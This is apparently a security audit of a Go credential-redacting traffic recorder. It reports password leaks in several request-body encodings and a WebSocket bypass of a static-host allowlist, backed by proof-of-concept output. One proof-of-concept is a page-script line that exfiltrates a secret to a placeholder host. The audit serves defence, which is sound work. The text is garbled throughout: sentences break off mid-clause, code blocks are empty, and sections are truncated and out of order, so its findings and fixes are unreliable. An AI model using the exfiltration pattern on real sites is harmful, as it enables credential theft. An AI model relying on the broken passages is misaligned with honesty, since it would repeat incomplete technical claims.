  The record pipeline gives the same picture (`TestPoCF751_PasswordShapedNames`, run on
  both copies):

  | case | e1dcd56 | f75119d |
  |---|---|---|
  | JSON key, nested JSON key, multipart `name`, GraphQL alias | `leaked=false` | `leaked=true` |

  Why this is not counted:
  - These leaks need the page to put the password itself in a name position. That is the
    same class as `json-key-pw-lower` (`{"soleil2024":true}`) and `urlenc-name-login`.
    The audits at 46c6fe5, fd93878 and e1dcd56 all judged that class not realistic for
    the planned suppliers and did not count it. Scoring the capitalised variant
    differently would not be consistent.
  - The realistic credential channel is a raw `login:password` body. It does not go
    through `dataLike`: `loneToken` (`reqbody.go:233`) handles it, the result is still
    0/3600, and the lone-body rows above are still redacted.
  - The rubric charges a narrowing like this only once it matches real supplier
    behaviour.

  Suggested hardening (optional):
  - Add `Soleil2024` and `Marseille13` as JSON keys to a `TestRedact_` test, so that any
    further narrowing is a deliberate choice.
  - Or treat "a name ending in 2+ digits after a lowercase letter, with no separator and
    one upper-case letter at most" as data. This keeps `deliveryAddressLine1`, `IDToken2`
    and `ctl00_…`.

  If a recording ever shows a supplier that puts user input in a name position, this
  whole class becomes a MEDIUM finding.
- Over-redaction (usability only): `item1Line2Field3`, `address1Line2` and ASP.NET
  `$`-joined names (`ctl00$ContentPlaceHolder1$txtEmail`) are redacted. The `$` names are
  rejected by `fieldNameRE` whatever `dataLike` says. `TestDataLikeNames` keeps all 17
  real field names it lists, and `TestPoCE1dc_OrdinaryNames` reports the same two
  32+-character lowercase names as at e1dcd56 (`xmlhttprequestcontentdisposition`,
  `acceptedtermsandconditionsversion`).
- GraphQL (`names.go:147-150`) uses the same `dataLike`, so the narrowing reaches

- Location: `internal/har/reqbody.go:180-186`. `str` sends a string to `graphQL` when its key

  glued to a name (`gqlLiteralRE`, `:52`). Unquoted words, comments, aliases and malformed
  numbers stay.
- Evidence (`TestPoCJ2b_ReqBody`, all with `rawCheck=0` and `scan=[]` unless noted):
  ```

  ```

  as plain text under `query`.
- Severity: LOW. A valid GraphQL login sends its credential as a quoted string, a number
  or a `$variable`, and those are redacted (`gql-enum-arg`, `gql-plus-num`, the SEC-J2-6
  PoCs). The leaking cases are invalid GraphQL, or non-GraphQL APIs that put user input
  under `query` (search boxes), or strings that look like JS object literals. None of
  these is a known login flow, and the scanner's email rule catches a real login
  identifier.
- Suggested fix: keep a string as GraphQL only if it is a GraphQL document after literal
  redaction, meaning it is made only of GraphQL punctuators, names, `$variables` and
  `[redacted]` literals, with no `#` comment and with balanced braces. Otherwise redact it
  whole. Do not use the key name `query` as a signal on its own. Regression test:
  `TestRedact_GraphQLOnlyKeepsDocuments`.

#### Checked, no finding

- **Taint stays name-based (design decision).** Request values under neutral names are
  redacted in the request, but they are not scrubbed from responses. Realistic echoes are
  the login identifier in a re-rendered form, a `Location` query, or a "welcome back"
  JSON. Those are personal data (`sanitize.sh` and the scanner's email/phone rules), not
  credentials. Password inputs, JWTs and bearer tokens are removed anywhere in responses.
  I found no realistic login flow that echoes a password under a neutral name.
- JSON numbers of any size (`12345678901234567890123`) are redacted. Booleans and nulls are
  kept by design.
- **GraphQL valid forms** are redacted: `+1234`, block strings and escaped quotes. An
  identifier argument (`pin: ABCD…`) is removed only because the name-based taint
  (`taintArgs`, `pin` is a credential name) scrubs it. Under a neutral argument name it
  would stay, but a credential passed as a GraphQL enum is not a realistic login.
- **Request query strings stay name-based** (`har.go:283-...`, `redactNV`, `RedactURL`).
  This is unchanged since J2-2 and documented ("secret fields in URLs"). A GET login with
  neutral parameter names would keep its values. That is not a request-body path, and no
  planned supplier uses it.

### New findings

#### SEC-J2-6 (HIGH, category 4, open): request bodies are parsed by declared MIME type only; JSON under a urlencoded type, or JSON inside a JSON string, is kept in clear

- Location: `internal/har/reqbody.go:42-44` (the urlencoded branch is chosen by MIME type
  before `looksJSON`; `redactQueryWith` finds no `=` in `{"password":"…"}` and keeps it),
  `reqbody.go:47-52` and `:59-68` (`redactArgs` only knows `name: "v"` and
  `name = "v"`, so a JSON object serialized inside a string value, `"{\"password\":\"…\"}"`,
  is not redacted), `reqbody.go:210-241` (`collectRequestBody` taints neither case, so
  `Scrub` cannot catch it), `internal/har/har.go:619` (`Check` compares with
  `RedactEntry`, so it reports nothing).
- Why it matters: jQuery's `$.ajax`/`$.post` default `contentType` is
  `application/x-www-form-urlencoded; charset=UTF-8`, and `$.post(url, JSON.stringify(creds))`
  is a common way older login pages send JSON. Double-encoded JSON (`{"data": "<json>"}`)
  is also common in RPC-style APIs. In both cases `facto record` writes the real password
  and login into a HAR that the tool and docs/security.md call redacted ("any other
  request body dropped"). harslim then copies it into `flow.json`, where the scanner does
  not see it either (SEC-J2-8). This is the same impact as SEC-J2-2; only the encoding
  differs.
- Evidence (throwaway `TestPoCAudit_ReqBody*` in internal/har, using the repository's own
  `recordPipeline` helper: Collect, RedactEntry, Scrub, Stabilize, and a `Check` that must
  be empty, as `record.Run` does):
  ```
  jquery-json-default-ct    (x-www-form-urlencoded, {"username":…,"password":…})          password leaked=true  login leaked=true
  double-json               (application/json, {"body":"{\"username\":…,\"password\":…}"})  password leaked=true  login leaked=true
  gql-block-string          (password: """…""" in a GraphQL query)                        password leaked=true
  gql-int-pin               (login(pin: 98127364), unquoted)                               pin leaked=true
  multipart-urlenc-part     (part "blob" = "user=x&password=…")                            password leaked=true
  multipart-gql-operations  (variables.email in an "operations" part)                      login leaked=true
  -- Check after redaction: no finding in every case
  ```
  The first two are realistic. The others are listed so the fix covers them.
- Suggested fix (test-first): stop trusting the declared type. For each request body, and
  recursively for each string value (JSON string, multipart part, urlencoded value) up to
  a small depth, try every parser that applies (JSON when it `looksJSON`, urlencoded
  pairs when it has `=`, GraphQL args including block strings and bare numbers). Redact
  request fields at every level. If a nested value parses and contains a request field
  that cannot be rewritten in place, drop the whole body (fail closed). Mirror this in
  `collectRequestBody` so the taint covers it too. Regression tests:
  `TestRedact_JSONBodyUnderURLEncodedType`, `TestRedact_JSONInsideJSONString`,
  `TestRedact_GraphQLBlockStringAndNumberArgs`, `TestRedact_NestedEncodingInMultipartPart`,
  and a `record-fakeprovider` step that does
  `fetch(url,{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:JSON.stringify(creds)})`
  with the canary password (checked by leakcheck).

#### SEC-J2-7 (LOW, category 10, open): the facto-side static client keeps a cookie jar; docs say "never a cookie"

- Location: `internal/browser/staticfetch/staticfetch.go:22-31` (`httpx.NewPinned(host,
  prefix, opts)` with `opts.Jar == nil`, so `internal/httpx/httpx.go:112-117` creates a

  nothing (or an httpx option to disable the jar). Test:

  header on the second). Or align docs/security.md with ADR 0008.

#### SEC-J2-8 (LOW, category 4, open): the fixture scanner misses JSON-escaped secret fields in flow.json request bodies

- Location: `internal/fixtures/scan.go:43` (`jsonFieldRE` needs `"name"\s*:\s*"value"`; in

- Evidence: `ScanText("flow.json", {"steps":[{"request_body":"{\"username\":\"…\",\"password\":\"Zq7Canary91xPw\"}"}]})`

- Impact: second layer only, but it is exactly where SEC-J2-6 lands. Fix: also match the

#### SEC-J2-9 (LOW, category 7, open): static downloads are held in memory beyond the 6-at-once bound

- Location: `internal/browser/fetch.go:535-539` (the semaphore is released when

### SEC-J2-1 (HIGH, category 5, open): a WebSocket to the static host reaches any path

- Location: `internal/browser/flags.go:97-106`, `internal/browser/fetch.go:219`, `:252-258`,
  `internal/browser/static.go:28-29`.
- What happens: the static allowlist puts the **whole host** into the `--host-resolver-rules`
  `EXCLUDE` list (flags.go:101-106). The path prefix and the "no WebSocket" rule are enforced
  only in `onRequestPaused` (Fetch). ADR 0008 itself says "Fetch alone misses WebSocket": in
  J1, the only control on `wss://` to an unlisted host was the resolver rule `MAP * ~NOTFOUND`.
  The `case "Document", "WebSocket"` refusal in `staticAllowed` (fetch.go:256) is therefore
  never reached for a real WebSocket. Once a host such as `storage.googleapis.com` is
  resolvable, any page script, frame or worker can open `wss://storage.googleapis.com/<any
  bucket>/<anything>?<data>`.
- Impact: this is the exfiltration and domain-allowlist bypass that the static allowlist was
  designed to prevent ("anyone can publish there"). The handshake GET carries an arbitrary
  path and query, chosen by the page, to the shared host. That host is outside the
  connector's AllowedDomains and outside its own prefix. For example, another bucket's owner
  on the same host can read the request URLs in their access logs. It is the same class as
  SEC-J1-1 (WebRTC, HIGH). Exposure today: `facto record --allow-static` (the documented
  Wecasa workflow, run on a real account at H4) and any connector that sets
  `Info().BrowserStatic` through `facto login`/`collect`. No connector shipped at this commit
  sets it.
- Evidence (real Chrome for Testing 156.0.8078.80, production Pool, `FlagsE2E` with
  `Static: ["https://static.supplier.example/app/"]`, throwaway test
  `TestPoC_StaticHostWebSocketOutsidePrefix`). Page script:
  `new WebSocket("wss://static.supplier.example/ws-allowed?exfil=SECRET")`. Output:
  ```
  server saw "HOST static.supplier.example /ws-allowed?exfil=SECRET" x1
  wsoutside-open: true
  fetchout-blocked: true     (fetch to the same off-prefix path IS blocked: Fetch works, WS bypasses it)
  ```
  The new unit test `TestFetch_StaticAllowsGETUnderPrefixOnly` checks `wss://` only through a
  fake `Fetch.requestPaused` event, which real Chrome never sends for a WebSocket. That is why
  it passes. The `record-fakeprovider` e2e checks `fetch` and script loads, never a WebSocket.
- Not affected (checked): top-level `Navigate` (refused by `checkURL`); `<iframe>`, `<object>`
  and `<embed>` documents on the static host (blocked: the server saw none of the three
  requests); off-prefix `fetch` (blocked); `Cookies()` (domain allowlist only); httpx (never
  receives static entries); POST to the prefix (blocked by method).
- Suggested fix (test-first): enforce the "no WebSocket to a static host" rule in a layer
  that sees WebSockets. Options:
  1. Turn on `Network.enable` on every enforced session and close a socket on
     `Network.webSocketCreated` before the handshake. This is fragile, because the handshake
     races the event.
  2. Better: refuse static entries whose host is not dedicated. Do not EXCLUDE the shared
     host in the resolver. Instead serve the prefix through `Fetch.fulfillRequest` from a
     facto-side fetch (httpx with a path-scoped rule). This keeps the host unresolvable in
     Chrome.
  3. At least: a real-Chrome regression test
     `TestAttack_ChromeStaticHostWebSocketBlocked` (WebSocket to the static host on and off
     the prefix, and to another bucket, from the page, a cross-site frame and a worker; the
     server must see zero handshakes). Without option 1 or 2 that test fails today.
  Update ADR 0008's "never ... WebSocket" claim until it holds.

### SEC-J2-2 (HIGH, category 4, open): the recorder keeps passwords sent as multipart/form-data, text/plain or GraphQL

- Location: `internal/har/har.go:457-470` (`redactBodyWith`: only JSON, `+json` and
  `application/x-www-form-urlencoded` are parsed by field; every other type gets the
  free-text `redactText` only), `internal/har/taint.go:163-180` (`collectBody`: same two
  formats, so the password is never tainted either), `internal/har/har.go:614` (`Check`
  compares with `RedactEntry`, so it cannot flag what `RedactEntry` misses).
- What happens: a login page that posts its form with `fetch(url, {body: new FormData(form)})`
  sends `multipart/form-data`. This is common in SPAs. Neither the field rules
  (`requestField`) nor the taint set see `name="password"` parts. `Check` reports 0 findings,
  so `facto record` writes the user's **real supplier password and login** to the HAR.
  It also prints "redacted" and spec.md promises "no password". `text/plain` bodies
  (`username=...&password=...`) and GraphQL mutations whose credentials are inside the
  `query` string of a JSON body leak the same way.
- Evidence 1 (unit, throwaway test `TestPoC_Redaction` in internal/har; Collect, RedactEntry,
  Scrub, Stabilize, as `record.Run` does):
  ```
  multipart  password leaked=true login leaked=true check=0
  textplain  password leaked=true login leaked=false check=0
  urlenc     password leaked=false login leaked=false check=0
  json       password leaked=false login leaked=false check=0
  graphql    password leaked=true login leaked=true check=0
  ```
- Evidence 2 (end to end, real Chrome 156, production `PoolBrowser.Tap` and `record.Run`,
  throwaway test `TestPoC_RecordMultipartPassword`):
  ```
  entries=3 check=0 password-in-file=true login-in-file=true
  POST https://login.supplier.example/mp-login mime="multipart/form-data; boundary=----WebKitFormBoundary..."
    body="...name=\"username\"\r\n\r\nalice@example.org\r\n...name=\"password\"\r\n\r\nZq7-Canary-Pw-91x\r\n..."
  ```
- Mitigating factor: the file is 0600 and refused inside git work trees and synced folders.
  But it is a plaintext credential in an artifact that the tool and the docs call redacted, and
  `harslim` copies `PostData.Text` into `flow.json` (`internal/fixtures/slim.go:121`), where
  the scanner does not catch it either (SEC-J2-3).
- Suggested fix (test-first): fail closed by MIME type. Parse `multipart/form-data` (stdlib
  `mime/multipart`, bounded) and apply `requestField` to each part name, both in
  `redactBodyWith` and `collectBody`. For every other request body type that cannot be parsed
  by field (text/plain, unknown, GraphQL), drop the request body by default (keep MIME and

### SEC-J2-5 (LOW, category 7, open): the recorder's memory use has no overall cap

- Location: `internal/record/record.go:282-308` (the full body, up to Chrome's 20 MiB
  per-resource buffer, is kept in the entry), `internal/har/har.go:42`
  (`MaxBodyBytes` 2 MiB per body after redaction), `record.go:28` (`DefaultMaxEntries` 5000).
